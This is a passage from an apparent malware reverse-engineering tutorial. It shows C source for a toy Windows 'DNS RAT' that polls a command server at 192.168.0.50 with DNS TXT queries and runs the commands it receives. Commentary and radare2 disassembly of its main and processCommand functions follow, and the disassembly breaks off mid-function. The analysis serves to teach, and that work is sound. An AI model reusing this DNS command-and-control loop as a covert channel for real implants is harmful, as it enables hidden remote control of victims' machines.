void processCommand(char buf[]){

    char c = buf[0];

    if(c == '1'){
        char msg[strlen(buf)-2];
        strncpy(msg, buf+2,strlen(buf)-2);
        int msgboxID = MessageBox(
        NULL,
        msg,
        "pwned",
        MB_ICONWARNING
        );
    }
    else if(c == '2'){
        int i = 0;
        char beep[strlen(buf)-2];
        strncpy(beep, buf+2,strlen(buf)-2);
        sscanf(beep, "%d", &i);
        Beep(beep,900);
        sleep(5);
    }
    else if(c == '3'){
        exit(0);
    }
    else{
        sleep(10);
    }

}

int main()
{
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0){
            printf("Failed. Error Code : %d",WSAGetLastError());
            return 1;
    }

    int i = 0;

    // WINSOCK INITIALIZATION
    SOCKET sock;
    SOCKADDR_IN ReceiverAddr , SrcInfo;
    SOCKADDR_IN SenderAddr;
    int slen = sizeof(ReceiverAddr) ;
    int port = 53;

    printf("1 - WINSOCK INITIALIZED. \n");

    if((sock = socket(AF_INET , SOCK_DGRAM, IPPROTO_UDP )) == INVALID_SOCKET){
        printf("Could not create socket : %d" , WSAGetLastError());
    }
    printf("2 - WINSOCK SOCKET CREATED. \n");
    ReceiverAddr.sin_family = AF_INET;
    ReceiverAddr.sin_port = htons(port);
    ReceiverAddr.sin_addr.s_addr = inet_addr("192.168.0.50");

    while(1==1){
        printf("Going for round: %d \n",i);
        unsigned char buf[65536],*qname,*reader;
        char host[100]; // DNS QUERY

        printf("DNS RAT UP AND RUNNING \n");

        // ------ DNS QUERY CRAFTING
        strcpy(host, "mark.ab.local");

        struct question *qinfo = NULL;
        struct dns_header *dns = NULL;

        // DNS QUERY HEADERS SETUP
        dns = (struct dns_header *)&buf;
        dns->id = (unsigned short) htons(getpid());
        dns->qr = 0; //This is a query
        dns->opcode = 0; //This is a standard query
        dns->aa = 0; //Not Authoritative
        dns->tc = 0; //This message is not truncated
        dns->rd = 1; //Recursion Desired
        dns->ra = 0; //Recursion not available! hey we dont have it (lol)
        dns->z = 0;
        dns->ad = 0;
        dns->cd = 0;
        dns->rcode = 0;
        dns->q_count = htons(1); //we have only 1 question
        dns->ans_count = 0;
        dns->auth_count = 0;
        dns->add_count = 0;

        // DNS QUESTION
        qname =(unsigned char*)&buf[sizeof(struct dns_header)];
        ChangetoDnsNameFormat(qname , host); // SUBSTITUTE '.' BY LENGTH
        // UPDATE THE QUERY BUFFER
        qinfo =(struct question*)&buf[sizeof(struct dns_header) + (strlen((const char*)qname) + 1)];
        // SET CLASS
        qinfo->type = htons(16); // 1 == 'A', 16 == 'TXT', we ask for TXT registers
        qinfo->tclass = htons(1); // 1 = INTERNET

        // ------ END OF DNS QUERY MAGIC

        if (sendto(sock,(char*)buf,sizeof(struct dns_header) + (strlen((const char*)qname)+1) + sizeof(struct question) , 0 , (struct SOCKADDR *) &ReceiverAddr, slen) == SOCKET_ERROR){
            printf("sendto() failed with error code : %d ", WSAGetLastError());
            exit(EXIT_FAILURE);
        }
        else{
            printf("3 - SENDTO() OK, packet sent\n");
        }

        if (recvfrom(sock, &buf, BUFLEN, 0,0,0) == SOCKET_ERROR){
            printf("error recving : %d" , WSAGetLastError());

        }else{
            printf("4 - RECVFROM() OK, packet received \n"); // joe.ab.local
            reader = &buf[sizeof(struct dns_header) + (strlen((const char*)qname)+1) + sizeof(struct question)];

            if(dns->ans_count > 0){
                int txt_position = 30 + strlen(host)-1;
                int txt_response_len = buf[txt_position];
                char command[txt_response_len];
                strncpy(command,buf + txt_position+1, txt_response_len);
                processCommand(command);
            }
        }

        i +=1;
    }
    WSACleanup();
    printf("WSACLEANUP() OK exiting \n");
    return 0;
}
```
So, it is similar to the previous one, this time the program uses the DNS TXT query/response flow to ask for and retrieve commands from an eventual command and control server.

The progam basically sends one DNS query after another retrieving commands that will tell about the next actions to do. The program will act according to those commands, let's disasm:

Here's the disasm
```
[0x004017f7]> pdf
/ (fcn) sym.main 1249
|   sym.main (int arg_20h, int arg_10040h, int arg_10042h, int arg_10044h, int arg_10050h, int arg_101f0h, int arg_101f8h, int arg_10200h, int arg_10204h, int arg_10208h, int arg_10210h, int arg_10218h, int arg_10220h, int arg_10228h, int arg_10234h, int arg_10238h, int arg_1023ch, int arg_10248h, int arg_30h, int arg_80h);
|           ; var int local_50h @ rbp-0x50
|           ; var int local_20h @ rsp+0x20
|           ; var int local_28h @ rsp+0x28
|           ; arg int arg_30h @ rsp+0x30
|           ; arg int arg_80h @ rsp+0x80
|           ; CALL XREF from 0x004013c2 (sym.__tmainCRTStartup)
|           0x004017f7      55             push rbp
|           0x004017f8      4155           push r13
|           0x004017fa      4154           push r12
|           0x004017fc      57             push rdi
|           0x004017fd      56             push rsi
|           0x004017fe      53             push rbx
|           0x004017ff      b8c8020100     mov eax, 0x102c8
|           0x00401804      e897190000     call fcn.004031a0
|           0x00401809      4829c4         sub rsp, rax
|           0x0040180c      488dac248000.  lea rbp, [arg_80h]          ; 0x80 ; 128
|           0x00401814      e8b7050000     call sym.__main
|           0x00401819      488d85500001.  lea rax, [arg_10050h]       ; 0x10050
|           0x00401820      4889c2         mov rdx, rax
|           0x00401823      b902020000     mov ecx, 0x202              ; 514
|           0x00401828      488b051d7c00.  mov rax, qword sym.imp.WS2_32.dll_WSAStartup ; [0x40944c:8]=0x97f2 reloc.WS2_32.dll_WSAStartup
|           0x0040182f      ffd0           call rax
|           0x00401831      85c0           test eax, eax
|       ,=< 0x00401833      7421           je 0x401856
|       |   0x00401835      488b05087c00.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x409444:8]=0x97e0 reloc.WS2_32.dll_WSAGetLastError
|       |   0x0040183c      ffd0           call rax
|       |   0x0040183e      89c2           mov edx, eax
|       |   0x00401840      488d0dc23700.  lea rcx, str.Failed._Error_Code_:__d ; 0x405009 ; "Failed. Error Code : %d"
|       |   0x00401847      e8ec190000     call sym.printf             ; int printf(const char *format)
|       |   0x0040184c      b801000000     mov eax, 1
|      ,==< 0x00401851      e972040000     jmp 0x401cc8
|      ||   ; CODE XREF from 0x00401833 (sym.main)
|      |`-> 0x00401856      c7853c020100.  mov dword [arg_1023ch], 0   ; [0x1023c:4]=0
|      |    0x00401860      c78538020100.  mov dword [arg_10238h], 0x10 ; 16
|      |    0x0040186a      c78534020100.  mov dword [arg_10234h], 0x35 ; '5' ; 53
|      |    0x00401874      488d0da63700.  lea rcx, str.1___WINSOCK_INITIALIZED. ; 0x405021 ; "1 - WINSOCK INITIALIZED. "
|      |    0x0040187b      e8b0190000     call sym.puts               ; int puts(const char *s)
|      |    0x00401880      41b811000000   mov r8d, 0x11               ; 17
|      |    0x00401886      ba02000000     mov edx, 2
|      |    0x0040188b      b902000000     mov ecx, 2
|      |    0x00401890      488b05dd7b00.  mov rax, qword sym.imp.WS2_32.dll_socket ; [0x409474:8]=0x982a reloc.WS2_32.dll_socket ; "*\x98"
|      |    0x00401897      ffd0           call rax
|      |    0x00401899      488985280201.  mov qword [arg_10228h], rax ; [0x10228:8]=0
|      |    0x004018a0      4883bd280201.  cmp qword [arg_10228h], 0xffffffffffffffff
|      |,=< 0x004018a8      7517           jne 0x4018c1
|      ||   0x004018aa      488b05937b00.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x409444:8]=0x97e0 reloc.WS2_32.dll_WSAGetLastError
|      ||   0x004018b1      ffd0           call rax
|      ||   0x004018b3      89c2           mov edx, eax
|      ||   0x004018b5      488d0d7f3700.  lea rcx, str.Could_not_create_socket_:__d ; 0x40503b ; "Could not create socket : %d"
|      ||   0x004018bc      e877190000     call sym.printf             ; int printf(const char *format)
|      ||   ; CODE XREF from 0x004018a8 (sym.main)
|      |`-> 0x004018c1      488d0d903700.  lea rcx, str.2___WINSOCK_SOCKET_CREATED. ; 0x405058 ; "2 - WINSOCK SOCKET CREATED. "
|      |    0x004018c8      e863190000     call sym.puts               ; int puts(const char *s)
|      |    0x004018cd      66c785400001.  mov word [arg_10040h], 2    ; [0x10040:2]=0x440
|      |    0x004018d6      8b8534020100   mov eax, dword [arg_10234h] ; [0x10234:4]=0
|      |    0x004018dc      0fb7c0         movzx eax, ax
|      |    0x004018df      89c1           mov ecx, eax
|      |    0x004018e1      488b056c7b00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409454:8]=0x9800 reloc.WS2_32.dll_htons
|      |    0x004018e8      ffd0           call rax
|      |    0x004018ea      668985420001.  mov word [arg_10042h], ax   ; [0x10042:2]=1
|      |    0x004018f1      488d0d7d3700.  lea rcx, str.192.168.0.50   ; 0x405075 ; "192.168.0.50"
|      |    0x004018f8      488b055d7b00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0x40945c:8]=0x9808 reloc.WS2_32.dll_inet_addr
|      |    0x004018ff      ffd0           call rax
|      |    0x00401901      898544000100   mov dword [arg_10044h], eax ; [0x10044:4]=0
|      |    ; CODE XREF from 0x00401cc3 (sym.main)
|      |.-> 0x00401907      8b853c020100   mov eax, dword [arg_1023ch] ; [0x1023c:4]=0
|      |:   0x0040190d      89c2           mov edx, eax
|      |:   0x0040190f      488d0d6c3700.  lea rcx, str.Going_for_round:__d ; 0x405082 ; "Going for round: %d \n"
|      |:   0x00401916      e81d190000     call sym.printf             ; int printf(const char *format)
|      |:   0x0040191b      488d0d763700.  lea rcx, str.DNS_RAT_UP_AND_RUNNING ; 0x405098 ; "DNS RAT UP AND RUNNING "
|      |:   0x00401922      e809190000     call sym.puts               ; int puts(const char *s)
|      |:   0x00401927      488d45b0       lea rax, [local_50h]
|      |:   0x0040192b      48bf6d61726b.  movabs rdi, 0x2e62612e6b72616d
|      |:   0x00401935      488938         mov qword [rax], rdi
|      |:   0x00401938      c740086c6f63.  mov dword [rax + 8], 0x61636f6c ; [0x61636f6c:4]=-1
|      |:   0x0040193f      66c7400c6c00   mov word [rax + 0xc], 0x6c  ; 'l' ; [0x6c:2]=0xffff ; 108
|      |:   0x00401945      48c785200201.  mov qword [arg_10220h], 0   ; [0x10220:8]=0
|      |:   0x00401950      48c785180201.  mov qword [arg_10218h], 0   ; [0x10218:8]=0
|      |:   0x0040195b      488d4520       lea rax, [arg_20h]          ; 0x20 ; 32
|      |:   0x0040195f      488985180201.  mov qword [arg_10218h], rax ; [0x10218:8]=0
|      |:   0x00401966      e825190000     call sym.getpid             ; int getpid(void)
|      |:   0x0040196b      0fb7c0         movzx eax, ax
|      |:   0x0040196e      89c1           mov ecx, eax
|      |:   0x00401970      488b05dd7a00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409454:8]=0x9800 reloc.WS2_32.dll_htons
|      |:   0x00401977      ffd0           call rax
|      |:   0x00401979      89c2           mov edx, eax
|      |:   0x0040197b      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|      |:   0x00401982      668910         mov word [rax], dx
|      |:   0x00401985      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|      |:   0x0040198c      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|      |:   0x00401990      83e27f         and edx, 0x7f
|      |:   0x00401993      885002         mov byte [rax + 2], dl
|      |:   0x00401996      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|      |:   0x0040199d      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|      |:   0x004019a1      83e287         and edx, 0xffffff87
|      |:   0x004019a4      885002         mov byte [rax + 2], dl
|      |:   0x004019a7      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|      |:   0x004019ae      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|      |:   0x004019b2      83e2fb         and edx, 0xfffffffb
|      |:   0x004019b5      885002         mov byte [rax + 2], dl
|      |:   0x004019b8      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|      |:   0x004019bf      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|      |:   0x004019c3      83e2fd         and edx, 0xfffffffd
|      |:   0x004019c6      885002         mov byte [rax + 2], dl
|      |:   0x004019c9      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|      |:   0x004019d0      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|      |:   0x004019d4      83ca01         or edx, 1
|      |:   0x004019d7      885002         mov byte [rax + 2], dl
|      |:   0x004019da      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|      |:   0x004019e1      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|      |:   0x004019e5      83e27f         and edx, 0x7f
|      |:   0x004019e8      885003         mov byte [rax + 3], dl
|      |:   0x004019eb      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|      |:   0x004019f2      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|      |:   0x004019f6      83e2bf         and edx, 0xffffffbf
|      |:   0x004019f9      885003         mov byte [rax + 3], dl
|      |:   0x004019fc      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|      |:   0x00401a03      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|      |:   0x00401a07      83e2df         and edx, 0xffffffdf
|      |:   0x00401a0a      885003         mov byte [rax + 3], dl
|      |:   0x00401a0d      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|      |:   0x00401a14      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|      |:   0x00401a18      83e2ef         and edx, 0xffffffef
|      |:   0x00401a1b      885003         mov byte [rax + 3], dl
|      |:   0x00401a1e      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|      |:   0x00401a25      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|      |:   0x00401a29      83e2f0         and edx, 0xfffffff0
|      |:   0x00401a2c      885003         mov byte [rax + 3], dl
|      |:   0x00401a2f      b901000000     mov ecx, 1
|      |:   0x00401a34      488b05197a00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409454:8]=0x9800 reloc.WS2_32.dll_htons
|      |:   0x00401a3b      ffd0           call rax
|      |:   0x00401a3d      89c2           mov edx, eax
|      |:   0x00401a3f      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|      |:   0x00401a46      66895004       mov word [rax + 4], dx
|      |:   0x00401a4a      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|      |:   0x00401a51      66c740060000   mov word [rax + 6], 0
|      |:   0x00401a57      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|      |:   0x00401a5e      66c740080000   mov word [rax + 8], 0
|      |:   0x00401a64      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|      |:   0x00401a6b      66c7400a0000   mov word [rax + 0xa], 0
|      |:   0x00401a71      488d4520       lea rax, [arg_20h]          ; 0x20 ; 32
|      |:   0x00401a75      4883c00c       add rax, 0xc
|      |:   0x00401a79      488985100201.  mov qword [arg_10210h], rax ; [0x10210:8]=0
|      |:   0x00401a80      488d45b0       lea rax, [local_50h]
|      |:   0x00401a84      488b8d100201.  mov rcx, qword [arg_10210h] ; [0x10210:8]=0
|      |:   0x00401a8b      4889c2         mov rdx, rax
|      |:   0x00401a8e      e8bdfaffff     call sym.ChangetoDnsNameFormat
|      |:   0x00401a93      488b85100201.  mov rax, qword [arg_10210h] ; [0x10210:8]=0
|      |:   0x00401a9a      4889c1         mov rcx, rax
|      |:   0x00401a9d      e876170000     call sym.strlen             ; size_t strlen(const char *s)
|      |:   0x00401aa2      488d500d       lea rdx, [rax + 0xd]        ; 13
|      |:   0x00401aa6      488d4520       lea rax, [arg_20h]          ; 0x20 ; 32
|      |:   0x00401aaa      4801d0         add rax, rdx                ; '('
|      |:   0x00401aad      488985200201.  mov qword [arg_10220h], rax ; [0x10220:8]=0
|      |:   0x00401ab4      b910000000     mov ecx, 0x10               ; 16
|      |:   0x00401ab9      488b05947900.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409454:8]=0x9800 reloc.WS2_32.dll_htons
|      |:   0x00401ac0      ffd0           call rax
|      |:   0x00401ac2      89c2           mov edx, eax
|      |:   0x00401ac4      488b85200201.  mov rax, qword [arg_10220h] ; [0x10220:8]=0
|      |:   0x00401acb      668910         mov word [rax], dx
|      |:   0x00401ace      b901000000     mov ecx, 1
|      |:   0x00401ad3      488b057a7900.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409454:8]=0x9800 reloc.WS2_32.dll_htons
|      |:   0x00401ada      ffd0           call rax
|      |:   0x00401adc      89c2           mov edx, eax
|      |:   0x00401ade      488b85200201.  mov rax, qword [arg_10220h] ; [0x10220:8]=0
|      |:   0x00401ae5      66895002       mov word [rax + 2], dx
|      |:   0x00401ae9      488b85100201.  mov rax, qword [arg_10210h] ; [0x10210:8]=0
|      |:   0x00401af0      4889c1         mov rcx, rax
|      |:   0x00401af3      e820170000     call sym.strlen             ; size_t strlen(const char *s)
|      |:   0x00401af8      83c011         add eax, 0x11
|      |:   0x00401afb      4189c0         mov r8d, eax
|      |:   0x00401afe      488d4520       lea rax, [arg_20h]          ; 0x20 ; 32
|      |:   0x00401b02      488b8d280201.  mov rcx, qword [arg_10228h] ; [0x10228:8]=0
|      |:   0x00401b09      8b9538020100   mov edx, dword [arg_10238h] ; [0x10238:4]=0
|      |:   0x00401b0f      89542428       mov dword [local_28h], edx
|      |:   0x00401b13      488d95400001.  lea rdx, [arg_10040h]       ; 0x10040
|      |:   0x00401b1a      4889542420     mov qword [local_20h], rdx
|      |:   0x00401b1f      41b900000000   mov r9d, 0
|      |:   0x00401b25      4889c2         mov rdx, rax
|      |:   0x00401b28      488b053d7900.  mov rax, qword sym.imp.WS2_32.dll_sendto ; [0x40946c:8]=0x9820 reloc.WS2_32.dll_sendto ; " \x98"
|      |:   0x00401b2f      ffd0           call rax
|      |:   0x00401b31      83f8ff         cmp eax, 0xffffffffffffffff
|     ,===< 0x00401b34      7521           jne 0x401b57
|     ||:   0x00401b36      488b05077900.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x409444:8]=0x97e0 reloc.WS2_32.dll_WSAGetLastError
|     ||:   0x00401b3d      ffd0           call rax
|     ||:   0x00401b3f      89c2           mov edx, eax
|     ||:   0x00401b41      488d0d683500.  lea rcx, str.sendto___failed_with_error_code_:__d ; 0x4050b0 ; "sendto() failed with error code : %d "
|     ||:   0x00401b48      e8eb160000     call sym.printf             ; int printf(const char *format)
|     ||:   0x00401b4d      b901000000     mov ecx, 1
|     ||:   0x00401b52      e811170000     call sym.exit
|     ||:   ; CODE XREF from 0x00401b34 (sym.main)
|     `---> 0x00401b57      488d0d783500.  lea rcx, str.3___SENDTO___OK__packet_sent ; 0x4050d6 ; "3 - SENDTO() OK, packet sent"
|      |:   0x00401b5e      e8cd160000     call sym.puts               ; int puts(const char *s)
|      |:   0x00401b63      488d4520       lea rax, [arg_20h]          ; 0x20 ; 32
|      |:   0x00401b67      488b8d280201.  mov rcx, qword [arg_10228h] ; [0x10228:8]=0
|      |:   0x00401b6e      48c744242800.  mov qword [local_28h], 0
|      |:   0x00401b77      48c744242000.  mov qword [local_20h], 0
|      |:   0x00401b80      41b900000000   mov r9d, 0
|      |:   0x00401b86      41b800000100   mov r8d, 0x10000
|      |:   0x00401b8c      4889c2         mov rdx, rax
|      |:   0x00401b8f      488b05ce7800.  mov rax, qword sym.imp.WS2_32.dll_recvfrom ; [0x409464:8]=0x9814 reloc.WS2_32.dll_recvfrom
|      |:   0x00401b96      ffd0           call rax
|      |:   0x00401b98      83f8ff         cmp eax, 0xffffffffffffffff
|     ,===< 0x00401b9b      751c           jne 0x401bb9
|     ||:   0x00401b9d      488b05a07800.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x409444:8]=0x97e0 reloc.WS2_32.dll_WSAGetLastError
|     ||:   0x00401ba4      ffd0           call rax
|     ||:   0x00401ba6      89c2           mov edx, eax
|     ||:   0x00401ba8      488d0d443500.  lea rcx, str.error_recving_:__d ; 0x4050f3 ; "error recving : %d"
|     ||:   0x00401baf      e884160000     call sym.printf             ; int printf(const char *format)
|    ,====< 0x00401bb4      e903010000     jmp 0x401cbc
|    |||:   ; CODE XREF from 0x00401b9b (sym.main)
|    |`---> 0x00401bb9      488d0d483500.  lea rcx, str.4___RECVFROM___OK__packet_received ; 0x405108 ; "4 - RECVFROM() OK, packet received "
|    | |:   0x00401bc0      e86b160000     call sym.puts               ; int puts(const char *s)
|    | |:   0x00401bc5      488b85100201.  mov rax, qword [arg_10210h] ; [0x10210:8]=0
|    | |:   0x00401bcc      4889c1         mov rcx, rax
|    | |:   0x00401bcf      e844160000     call sym.strlen             ; size_t strlen(const char *s)
|    | |:   0x00401bd4      488d5011       lea rdx, [rax + 0x11]       ; 17
|    | |:   0x00401bd8      488d4520       lea rax, [arg_20h]          ; 0x20 ; 32
|    | |:   0x00401bdc      4801d0         add rax, rdx                ; '('
|    | |:   0x00401bdf      488985080201.  mov qword [arg_10208h], rax ; [0x10208:8]=0
|    | |:   0x00401be6      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|    | |:   0x00401bed      0fb74006       movzx eax, word [rax + 6]   ; [0x6:2]=0xffff ; 6
|    | |:   0x00401bf1      6685c0         test ax, ax
|    |,===< 0x00401bf4      0f84c2000000   je 0x401cbc
|    |||:   0x00401bfa      4889e0         mov rax, rsp
|    |||:   0x00401bfd      4889c7         mov rdi, rax
|    |||:   0x00401c00      488d45b0       lea rax, [local_50h]
|    |||:   0x00401c04      4889c1         mov rcx, rax
|    |||:   0x00401c07      e80c160000     call sym.strlen             ; size_t strlen(const char *s)
|    |||:   0x00401c0c      83c01d         add eax, 0x1d
|    |||:   0x00401c0f      898504020100   mov dword [arg_10204h], eax ; [0x10204:4]=0
|    |||:   0x00401c15      8b8504020100   mov eax, dword [arg_10204h] ; [0x10204:4]=0
|    |||:   0x00401c1b      4898           cdqe
|    |||:   0x00401c1d      0fb6440520     movzx eax, byte [rbp + rax + 0x20] ; [0x20:1]=255 ; 32
|    |||:   0x00401c22      0fb6c0         movzx eax, al
|    |||:   0x00401c25      898500020100   mov dword [arg_10200h], eax ; [0x10200:4]=0
|    |||:   0x00401c2b      8b8500020100   mov eax, dword [arg_10200h] ; [0x10200:4]=0
|    |||:   0x00401c31      4863d0         movsxd rdx, eax
|    |||:   0x00401c34      4883ea01       sub rdx, 1
|    |||:   0x00401c38      488995f80101.  mov qword [arg_101f8h], rdx ; [0x101f8:8]=0
|    |||:   0x00401c3f      4863d0         movsxd rdx, eax
|    |||:   0x00401c42      4889d3         mov rbx, rdx
|    |||:   0x00401c45      be00000000     mov esi, 0
|    |||:   0x00401c4a      4863d0         movsxd rdx, eax
|    |||:   0x00401c4d      4989d4         mov r12, rdx
|    |||:   0x00401c50      41bd00000000   mov r13d, 0
|    |||:   0x00401c56      4898           cdqe
|    |||:   0x00401c58      4883c00f       add rax, 0xf
|    |||:   0x00401c5c      48c1e804       shr rax, 4
|    |||:   0x00401c60      48c1e004       shl rax, 4
|    |||:   0x00401c64      e837150000     call fcn.004031a0
|    |||:   0x00401c69      4829c4         sub rsp, rax
|    |||:   0x00401c6c      488d442430     lea rax, [arg_30h]          ; 0x30 ; '0' ; 48
|    |||:   0x00401c71      4883c000       add rax, 0
|    |||:   0x00401c75      488985f00101.  mov qword [arg_101f0h], rax ; [0x101f0:8]=0
|    |||:   0x00401c7c      8b8500020100   mov eax, dword [arg_10200h] ; [0x10200:4]=0
|    |||:   0x00401c82      4863c8         movsxd rcx, eax
|    |||:   0x00401c85      8b8504020100   mov eax, dword [arg_10204h] ; [0x10204:4]=0
|    |||:   0x00401c8b      4898           cdqe
|    |||:   0x00401c8d      488d5001       lea rdx, [rax + 1]          ; 1
|    |||:   0x00401c91      488d4520       lea rax, [arg_20h]          ; 0x20 ; 32
|    |||:   0x00401c95      4801c2         add rdx, rax                ; '#'
|    |||:   0x00401c98      488b85f00101.  mov rax, qword [arg_101f0h] ; [0x101f0:8]=0
|    |||:   0x00401c9f      4989c8         mov r8, rcx
|    |||:   0x00401ca2      4889c1         mov rcx, rax
|    |||:   0x00401ca5      e85e150000     call sym.strncpy            ; char *strncpy(char *dest, const char *src, size_t  n)
|    |||:   0x00401caa      488b85f00101.  mov rax, qword [arg_101f0h] ; [0x101f0:8]=0
|    |||:   0x00401cb1      4889c1         mov rcx, rax
|    |||:   0x00401cb4      e87bf9ffff     call sym.processCommand
|    |||:   0x00401cb9      4889fc         mov rsp, rdi
|    |||:   ; CODE XREF from 0x00401bb4 (sym.main)
|    |||:   ; CODE XREF from 0x00401bf4 (sym.main)
|    ``---> 0x00401cbc      83853c020100.  add dword [arg_1023ch], 1
|      |`=< 0x00401cc3      e93ffcffff     jmp 0x401907
|      |    ; CODE XREF from 0x00401851 (sym.main)
|      `--> 0x00401cc8      488da5480201.  lea rsp, [arg_10248h]       ; 0x10248
|           0x00401ccf      5b             pop rbx
|           0x00401cd0      5e             pop rsi
|           0x00401cd1      5f             pop rdi
|           0x00401cd2      415c           pop r12
|           0x00401cd4      415d           pop r13
|           0x00401cd6      5d             pop rbp
\           0x00401cd7      c3             ret
[0x004017f7]>                                                   
```
Again, this program is huge and we are not going to go line by line with this. We already know about most of the thing that is going on here, let's see:

We see a couple of interesting things here:
```
|      |:   0x00401922      e809190000     call sym.puts               ; int puts(const char *s)
|      |:   0x00401927      488d45b0       lea rax, [local_50h]
|      |:   0x0040192b      48bf6d61726b.  movabs rdi, 0x2e62612e6b72616d
|      |:   0x00401935      488938         mov qword [rax], rdi

|      |    0x004018e1      488b056c7b00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409454:8]=0x9800 reloc.WS2_32.dll_htons
|      |    0x004018e8      ffd0           call rax
|      |    0x004018ea      668985420001.  mov word [arg_10042h], ax   ; [0x10042:2]=1
|      |    0x004018f1      488d0d7d3700.  lea rcx, str.192.168.0.50   ; 0x405075 ; "192.168.0.50"
|      |    0x004018f8      488b055d7b00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0x40945c:8]=0x9808 reloc.WS2_32.dll_inet_addr
``` 
We see 6d61726b2e61622e == mark.ab. (0x61636f6c = local) and we also see the remote server addr. So now we know we are targeting that through DNS.

One simple approach at this point would be to actually perform the request manually ourselves and inspect the answers, but let's see how the progam deals with that:

We see the main loop, and at the end we see this function, that seems to receive the TXT answer as parameter:
```
|    |||:   0x00401caa      488b85f00101.  mov rax, qword [arg_101f0h] ; [0x101f0:8]=0
|    |||:   0x00401cb1      4889c1         mov rcx, rax
|    |||:   0x00401cb4      e87bf9ffff     call sym.processCommand
|    |||:   0x00401cb9      4889fc         mov rsp, rdi
```
That'll be a nice place to inspect and set some breakpoints inside:
```
[0x00401634]> pdf
/ (fcn) sym.processCommand 451
|   sym.processCommand (int arg_40h);

|           ; var int local_80h @ rsp+0x80
|           ; CALL XREF from 0x00401cb4 (sym.main)
|           0x00401634      55             push rbp
|           0x00401635      4157           push r15
|           0x00401637      4156           push r14
|           0x00401639      4155           push r13
|           0x0040163b      4154           push r12
|           0x0040163d      57             push rdi
|           0x0040163e      56             push rsi
|           0x0040163f      53             push rbx
|           0x00401640      4883ec78       sub rsp, 0x78               ; 'x'
|           0x00401644      488dac248000.  lea rbp, [local_80h]        ; 0x80 ; 128
|           0x0040164c      48894d40       mov qword [arg_40h], rcx    ; [0x40:8]=-1 ; '@' ; 64
|           0x00401650      488b4540       mov rax, qword [arg_40h]    ; [0x40:8]=-1 ; '@' ; 64
|           0x00401654      0fb600         movzx eax, byte [rax]
|           0x00401657      8845ef         mov byte [local_11h], al
|           0x0040165a      807def31       cmp byte [local_11h], 0x31  ; [0x31:1]=255 ; '1' ; 49
|       ,=< 0x0040165e      0f85a5000000   jne 0x401709
|       |   0x00401664      4889e0         mov rax, rsp
|       |   0x00401667      4889c3         mov rbx, rax
|       |   0x0040166a      488b4d40       mov rcx, qword [arg_40h]    ; [0x40:8]=-1 ; '@' ; 64
|       |   0x0040166e      e8a51b0000     call sym.strlen             ; size_t strlen(const char *s)
|       |   0x00401673      4883e802       sub rax, 2
|       |   0x00401677      4889c2         mov rdx, rax
|       |   0x0040167a      4883ea01       sub rdx, 1
|       |   0x0040167e      488955e0       mov qword [local_20h_2], rdx
|       |   0x00401682      488945a0       mov qword [local_60h], rax
|       |   0x00401686      48c745a80000.  mov qword [local_58h], 0
|       |   0x0040168e      4989c6         mov r14, rax
|       |   0x00401691      41bf00000000   mov r15d, 0
|       |   0x00401697      4883c00f       add rax, 0xf
|       |   0x0040169b      48c1e804       shr rax, 4
|       |   0x0040169f      48c1e004       shl rax, 4
|       |   0x004016a3      e8f81a0000     call fcn.004031a0
|       |   0x004016a8      4829c4         sub rsp, rax
|       |   0x004016ab      488d442420     lea rax, [local_20h]        ; 0x20 ; 32
|       |   0x004016b0      4883c000       add rax, 0
|       |   0x004016b4      488945d8       mov qword [local_28h], rax
|       |   0x004016b8      488b4d40       mov rcx, qword [arg_40h]    ; [0x40:8]=-1 ; '@' ; 64
|       |   0x004016bc      e8571b0000     call sym.strlen             ; size_t strlen(const char *s)
|       |   0x004016c1      488d48fe       lea rcx, [rax - 2]
|       |   0x004016c5      488b4540       mov rax, qword [arg_40h]    ; [0x40:8]=-1 ; '@' ; 64
|       |   0x004016c9      488d5002       lea rdx, [rax + 2]          ; 2
|       |   0x004016cd      488b45d8       mov rax, qword [local_28h]
|       |   0x004016d1      4989c8         mov r8, rcx
|       |   0x004016d4      4889c1         mov rcx, rax
|       |   0x004016d7      e82c1b0000     call sym.strncpy            ; char *strncpy(char *dest, const char *src, size_t  n)
